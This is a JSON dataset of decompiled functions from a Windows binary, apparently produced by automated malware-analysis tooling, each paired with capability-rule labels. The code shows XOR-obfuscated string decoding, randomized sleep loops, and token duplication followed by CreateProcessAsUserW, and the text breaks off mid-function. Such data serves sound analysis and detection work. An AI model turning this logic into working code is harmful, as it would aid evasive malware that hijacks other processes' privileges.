{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00401000(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 81920 named .text\n    var_ch = -1;\n    var_8h = *0x427964;\n    var_48h = 0x1571a10;\n    var_44h = 0x10162401;\n    var_40h = 0x2e0f0f5d;\n    var_3ch = 0x155b161c;\n    var_38h = 0xc023015;\n    var_34h = 0x3a131341;\n    var_30h = 0x481a0208;\n    var_2ch = 0x4b43733b;\n    var_28h = 0x75525000;\n    var_24h = 0x65044149;\n    var_20h = 0x65347871;\n    var_1ch._0_2_ = 0x4264;\n    var_18h = param_2;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n    sub.ntdll.dll_memset(puVar7, 0, 0x29);\n    var_4h = 0;\n    var_10h = &var_48h - puVar7;\n    do {\n        iVar11 = var_4h;\n        puVar10 = puVar7 + var_4h;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = *(&var_20h + iVar11 % 6);\n        uVar2 = puVar10[var_10h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *puVar10 = cVar5 + ((uVar1 ^ uVar2) - cVar4);\n    } while (var_4h < 0x28);\n    iVar11 = 0;\n    pcVar12 = str.OG_vAY__;\n    do {\n        uVar8 = pcVar12[iVar11] << 8;\n        iVar9 = 0;\n        var_10h = 1;\n        do {\n            if (uVar8 >> 8 != '\\0') {\n                puVar10 = puVar7;\n                for (uVar8 = uVar8 & 0xffffff00 | *puVar7; uVar8 != uVar8 >> 8; uVar8 = uVar8 & 0xffffff00 | *puVar10) {\n                    if (uVar8 == '\\0') {\n                        bVar3 = false;\n                        goto code_r0x00401101;\n                    }\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar3 = true;\ncode_r0x00401101:\n        if (((*pcVar12 != '\\0') && (pcVar12[0x1f] == '\\0')) && (bVar3)) {\n            iVar9 = fcn.004067fd();\n            if (iVar9 != -1) {\n                *var_18h = iVar9;\n                var_ch = iVar11;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar12 = pcVar12 + 0x20;\n        iVar11 = iVar11 + 1;\n    } while (pcVar12 < 0x426260);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n    return var_ch;\n}\n",
        "token_count": 1133
    },
    "00401178": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401178(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *in_EDX;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uint var_d8h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uVar4 = 0;\n    puVar6 = &var_d8h;\n    var_10h = in_EDX;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.0040d605(),  -1 < iVar2)) {\n        var_4h = fcn.0041019c(var_8h, var_ch);\n        if (var_4h != NULL) {\n            pcVar3 = str.OG_vAY__;\n            pcVar5 = var_4h;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.OG_vAY__;\n            pcVar7 = var_4h;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = var_4h;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_4h, str.OG_vAY__ + arg_8h * 0x20);\n            pcVar5 = var_4h;\n            do {\n                pcVar5 = pcVar5 + 0x20;\n                if (*pcVar3 != '\\0') {\n                    (*pcVar1)(pcVar5, pcVar3);\n                }\n                pcVar3 = pcVar3 + 0x20;\n                in_EDX = var_10h;\n            } while (pcVar3 < 0x426240);\n        }\n        fcn.0041016b();\n        *in_EDX = var_ch;\n        uVar4 = 1;\n        in_EDX[1] = var_8h;\n    }\n    return uVar4;\n}\n",
        "token_count": 738
    },
    "00401322": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401322(uint *arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar auStack428 [4];\n    uchar auStack424 [4];\n    uint uStack420;\n    uchar auStack408 [404];\n    \n    uVar6 = *0x427964;\n    uStack420 = *arg_8h;\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x202, auStack408);\n    pcVar1 = _sym.imp.KERNEL32.dll_OutputDebugStringA;\n    puVar7 = auStack424;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = 0x427644;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*pcVar1)(\"WMA 0\");\n    cVar2 = fcn.0040fcdb();\n    if (cVar2 != '\\0') {\n        iVar5 = fcn.00401178(0);\n        if (iVar5 != 0) {\n            (*pcVar1)(\"WMA 1\");\n            fcn.0041016b();\n        }\n    }\n    do {\n        if (*0x427bb4 != 0) {\n            return 0;\n        }\n        iVar8 = 0;\n        iVar5 = fcn.00401000();\n        if (iVar5 != -1) {\n            iVar3 = fcn.00406884();\n            if ((iVar3 != iVar8) && (iVar8 != 0)) {\n                puVar7 = auStack428;\n                uVar4 = extraout_ECX;\n                iVar8 = fcn.00401251(puVar7, iVar5);\n                if ((iVar8 != 0) && ((arg_8h[1] != 0 && (iVar3 != 0)))) {\n                    (*_sym.imp.KERNEL32.dll_ExitProcess)(0, puVar7, iVar5, uVar4);\n                    pcVar1 = swi(3);\n                    uVar4 = (*pcVar1)();\n                    return uVar4;\n                }\n            }\n        }\n        uVar6 = uVar6 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar6 % 600000 + 60000);\n    } while( true );\n}\n",
        "token_count": 633
    },
    "00401f77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401f77(int32_t param_1)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    \n    puVar2 = *0x427858;\n    if (*0x427858 == NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 4000);\n        puVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        puVar4 = puVar2;\n        *0x427858 = puVar2;\n        for (iVar3 = 4000; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        if (puVar2 == NULL) {\n            return 1;\n        }\n    }\n    iVar3 = 0;\n    while( true ) {\n        if (*(puVar2 + iVar3 * 4) == param_1) {\n            return 1;\n        }\n        if (*(puVar2 + iVar3 * 4) == 0) break;\n        iVar3 = iVar3 + 1;\n        if (999 < iVar3) {\n            return 1;\n        }\n    }\n    *(puVar2 + iVar3 * 4) = param_1;\n    return 0;\n}\n",
        "token_count": 310
    },
    "00402281": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402281(int32_t param_1, ushort *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    var_4h = param_1;\n    if (*0x427bbc == NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32\", \"QueryFullProcessImageNameW\");\n        *0x427bbc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        if (*0x427bbc == NULL) {\n            return;\n        }\n    }\n    *param_2 = 0;\n    if (param_1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, param_1);\n        var_4h = 0x104;\n        if (iVar2 != 0) {\n            (**0x427bbc)(iVar2, 0, param_2, &var_4h);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00402413": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00402413(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uint lpCommandLine;\n    uint var_f0h;\n    int32_t var_e8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint TokenHandle;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint pSessionId;\n    uint var_6ch;\n    int32_t ProcessHandle;\n    uint hExistingToken;\n    uint pSid;\n    int32_t var_5ch;\n    uint pIdentifierAuthority;\n    uint var_54h;\n    int32_t *var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint hObject;\n    int32_t dwProcessId;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_54h._0_2_ = 0x1000;\n    piVar12 = param_2;\n    for (iVar10 = 0x10; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *piVar12 = 0;\n        piVar12 = piVar12 + 1;\n    }\n    var_1ch = 0x357e4654;\n    puVar9 = &var_f0h;\n    var_50h = param_2;\n    for (iVar10 = 0x44; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_18h = 0x5330747b;\n    puVar9 = &var_98h;\n    for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_14h = 0x460c5642;\n    var_10h = 0x742c352a;\n    puVar9 = &lpCommandLine;\n    for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_ch._0_1_ = 0x46;\n    var_ch._1_1_ = 0x53;\n    pSessionId = 0;\n    var_48h = 0;\n    hObject = 0;\n    hExistingToken = 0;\n    var_4ch = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    var_8h = 0x35534674;\n    var_4h._0_1_ = 0x56;\n    fcn.00403728(0);\n    var_3ch = &var_1ch - var_84h;\n    iVar10 = 0;\n    do {\n        pcVar1 = var_84h + iVar10;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar10 % 5);\n        uVar3 = pcVar1[var_3ch];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar10 = iVar10 + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (iVar10 < 0x12);\n    var_20h = 0x45624b58;\n    var_1ch = 0x4b0b6848;\n    var_18h = 0x6817452a;\n    var_14h = 0x45264b0e;\n    var_10h = 0x4b1d6806;\n    var_ch._0_1_ = 0x4f;\n    var_ch._1_1_ = 0x45;\n    var_30h = 0x454f4b78;\n    var_2ch._0_2_ = 0x6865;\n    fcn.0040379b(var_84h);\n    iVar10 = 0;\n    var_3ch = &var_20h - var_74h;\n    do {\n        pcVar1 = var_74h + iVar10;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_30h + iVar10 % 6);\n        uVar3 = pcVar1[var_3ch];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar10 = iVar10 + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (iVar10 < 0x16);\n    (*_sym.imp.SHLWAPI.dll_StrCpyW)(&lpCommandLine, *0x4279dc);\n    pcVar4 = _sym.imp.SHLWAPI.dll_StrCatW;\n    (*_sym.imp.SHLWAPI.dll_StrCatW)(&lpCommandLine, var_84h);\n    (*pcVar4)(&lpCommandLine, var_74h);\n    iVar10 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, dwProcessId);\n    var_18h = 0xb07363b;\n    var_14h = 0x47603c0a;\n    var_10h = 0x3f3c0b4b;\n    var_ch._0_1_ = 0x75;\n    var_8h = 0x65755350;\n    var_4h._0_1_ = 0x6f;\n    ProcessHandle = iVar10;\n    fcn.004034a8(extraout_ECX);\n    iVar11 = 0;\n    do {\n        fcn.004034cf(iVar11, *(&var_8h + iVar11 % 5) ^ *(&var_18h + iVar11));\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xd);\n    if (iVar10 != 0) {\n        var_18h = 0xb07363b;\n        var_14h = 0x47603c0a;\n        var_10h = 0x3f3c0b4b;\n        var_ch._0_1_ = 0x75;\n        var_8h = 0x65755350;\n        var_4h._0_1_ = 0x6f;\n        fcn.004034a8(extraout_ECX_00);\n        iVar11 = 0;\n        do {\n            fcn.004034cf(iVar11, *(&var_8h + iVar11 % 5) ^ *(&var_18h + iVar11));\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0xd);\n        iVar11 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n        if (iVar11 != 0) {\n            var_24h = 0xf633f17;\n            var_20h = 0x61322b2b;\n            var_1ch = 0x2e2d3d03;\n            var_18h = 0x3f20335f;\n            var_14h = 0x2f174024;\n            var_10h = 0x145d222d;\n            var_ch._0_1_ = 0x4e;\n            var_8h = 0x7a324b59;\n            var_4h._0_1_ = 0x4e;\n            fcn.0040351e(extraout_ECX_01);\n            iVar11 = dwProcessId;\n            var_5ch = &var_24h - dwProcessId;\n            var_40h = 0;\n            do {\n                iVar10 = var_40h;\n                pcVar1 = var_40h + iVar11;\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_8h + iVar10 % 5);\n                uVar3 = pcVar1[var_5ch];\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar10 = ProcessHandle;\n                var_40h = var_40h + 1;\n                *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n            } while (var_40h < 0x19);\n            iVar7 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar7 != 0) {\n                iVar7 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hObject);\n                pcVar4 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar7 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hObject, 0xc, pSessionId, 4);\n                    iVar10 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                       (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar10 != 0) {\n                        var_94h = 0x20;\n                        var_98h = pSid;\n                        iVar10 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar4)(hObject, 0x19, &var_98h, iVar10 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_5ch = 0;\n                    (*pcVar4)(hObject, 0x1b, &var_5ch, 4);\n                    iVar10 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_4ch, hObject, 1);\n                    if (iVar10 == 0) {\n                        var_4ch = 0;\n                    }\n                    else {\n                        var_48h = 0x400;\n                    }\n                    var_f0h = 0x44;\n                    var_28h = 0x772c4f44;\n                    var_24h = 0x453c3319;\n                    var_20h = 0x4f527703;\n                    var_1ch = 0x332b7775;\n                    var_18h = 0x7712452b;\n                    var_14h = 0x77244f55;\n                    var_10h = 0x45233302;\n                    var_ch._0_1_ = 3;\n                    var_ch._1_1_ = 0x77;\n                    var_ch._2_2_ = 0x4f33;\n                    var_30h = 0x77454f33;\n                    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x77);\n                    fcn.0040356c(extraout_ECX_02);\n                    var_8h = &var_28h - var_7ch;\n                    var_40h = 0;\n                    do {\n                        iVar10 = var_40h;\n                        pcVar1 = var_7ch + var_40h;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_30h + iVar10 % 5);\n                        uVar3 = pcVar1[var_8h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        var_40h = var_40h + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (var_40h < 0x20);\n                    var_20h = 0x3318534a;\n                    var_1ch = 0x6e3b390f;\n                    var_18h = 0x534a6c5c;\n                    var_14h = 0x3942331a;\n                    var_10h = 0x6c4b6e36;\n                    var_ch._0_1_ = 0x5c;\n                    var_ch._1_1_ = 0x53;\n                    var_ch._2_2_ = 0x336e;\n                    var_30h = 0x336e5339;\n                    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x6c);\n                    fcn.004035d3(var_7ch);\n                    iVar10 = 0;\n                    var_8h = &var_20h - var_a0h;\n                    do {\n                        pcVar1 = var_a0h + iVar10;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_30h + iVar10 % 5);\n                        uVar3 = pcVar1[var_8h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        iVar10 = iVar10 + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (iVar10 < 0x18);\n                    var_e8h = var_7ch;\n                    var_c0h._0_2_ = 0;\n                    var_c4h = 1;\n                    var_1ch = 0x736e671a;\n                    var_18h = 0x4b453831;\n                    var_14h = 0x6718425f;\n                    var_10h = 0x3831736e;\n                    var_ch._0_1_ = 0x67;\n                    var_ch._1_1_ = 0x4b;\n                    var_30h = 0x734b6738;\n                    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x42);\n                    fcn.0040363a(var_a0h);\n                    var_8h = &var_1ch - var_8ch;\n                    var_40h = 0;\n                    do {\n                        iVar10 = var_40h;\n                        pcVar1 = var_8ch + var_40h;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_30h + iVar10 % 5);\n                        uVar3 = pcVar1[var_8h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        var_40h = var_40h + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (var_40h < 0x12);\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hObject, 0, &lpCommandLine, 0, 0, 0, var_48h, var_4ch, 0, &var_f0h, var_50h);\n                    var_1ch = 0x62304502;\n                    var_18h = 0x41307a3c;\n                    var_14h = 0x45135215;\n                    var_10h = 0x7a3d622f;\n                    var_ch._0_1_ = 0x45;\n                    var_ch._1_1_ = 0x41;\n                    var_30h = 0x6241457a;\n                    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x52);\n                    fcn.004036b5(extraout_ECX_03);\n                    var_8h = &var_1ch - var_40h;\n                    iVar10 = 0;\n                    do {\n                        pcVar1 = var_40h + iVar10;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_30h + iVar10 % 5);\n                        uVar3 = pcVar1[var_8h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        iVar10 = iVar10 + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (iVar10 < 0x12);\n                    if (*var_50h != 0) {\n                        var_14h = 0x102b3831;\n                        var_10h = 0x2307022e;\n                        var_ch._0_1_ = 0x2a;\n                        var_ch._1_1_ = 0x42;\n                        var_30h = 0x42474c63;\n                        var_2ch._0_2_ = 0x6c4f;\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                        puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n                        var_48h = 0;\n                        *puVar9 = 0;\n                        puVar9[1] = 0;\n                        *(puVar9 + 2) = 0;\n                        *(puVar9 + 10) = 0;\n                        var_8h = &var_14h - puVar9;\n                        do {\n                            iVar10 = var_48h;\n                            pcVar1 = var_48h + puVar9;\n                            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uVar2 = *(&var_30h + iVar10 % 6);\n                            uVar3 = pcVar1[var_8h];\n                            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            piVar12 = var_50h;\n                            var_48h = var_48h + 1;\n                            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                        } while (var_48h < 10);\n                        iVar10 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_50h, 0x201eb, &TokenHandle);\n                        if (iVar10 != 0) {\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(piVar12[1]);\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n                        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n                    }\n                    if (var_4ch != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_4ch);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n                    fcn.00403684();\n                    fcn.00403615();\n                    fcn.004035ae();\n                    fcn.00403547();\n                    iVar10 = ProcessHandle;\n                    iVar11 = dwProcessId;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hExistingToken);\n            }\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar10);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_6ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    iVar10 = *var_50h;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_3ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    fcn.0040376a();\n    fcn.004036f7();\n    return iVar10;\n}\n",
        "token_count": 4775
    },
    "00402bb2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402bb2(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uint extraout_EDX;\n    uchar *puVar10;\n    uint uStack624;\n    uchar *puStack620;\n    uint32_t uStack616;\n    int32_t iStack584;\n    int32_t iStack580;\n    uchar auStack572 [4];\n    uchar auStack568 [16];\n    uchar auStack552 [24];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar10 = &stack0xfffffdc8;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack616 = 0;\n    puVar10 = &stack0xfffffdd8;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &stack0xfffffdf0;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &stack0xfffffdb8;\n    for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    if (*0x427bb4 == 0) goto code_r0x00402bfe;\n    do {\n        while( true ) {\n            do {\n                uStack616 = 0x402bfe;\n                (*_sym.imp.KERNEL32.dll_ExitThread)();\n                uStack616 = extraout_EDX;\ncode_r0x00402bfe:\n                puStack620 = 0x100400;\n                uStack624 = 0x402c10;\n                iVar8 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n            } while (iVar8 == 0);\n            if (*0x4279d8 == 0) {\n                iVar3 = fcn.004022f2();\n            }\n            else {\n                iVar3 = fcn.00402413();\n                uStack616 = 0x402c46;\n                fcn.00409a17(&stack0xfffffdc4);\n            }\n            if (iVar3 != 0) break;\n            piVar9 = &stack0xfffffdf0;\n            do {\n                iVar1 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar1 != 0);\n            if (piVar9 - &stack0xfffffdf2 >> 1 != 0) {\n                uStack616 = 0x402d2a;\n                uStack616 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n                uStack616 = uStack616 & 0xffff;\n                puStack620 = 0x402d34;\n                (*_sym.imp.KERNEL32.dll_DeleteAtom)();\n            }\n        }\n        uVar4 = 0;\n        do {\n            if (*(uVar4 * 4 + 0x427860) == 0) goto code_r0x00402c75;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x40);\n        uVar4 = 0;\ncode_r0x00402c75:\n        *(uVar4 * 4 + 0x427860) = iVar3;\n        fcn.0040191e();\n        uStack616 = 0;\n        puStack620 = &stack0xfffffdb8;\n        uStack624 = 2;\n        iStack584 = iVar3;\n        iStack580 = iVar8;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)();\n        *(uVar4 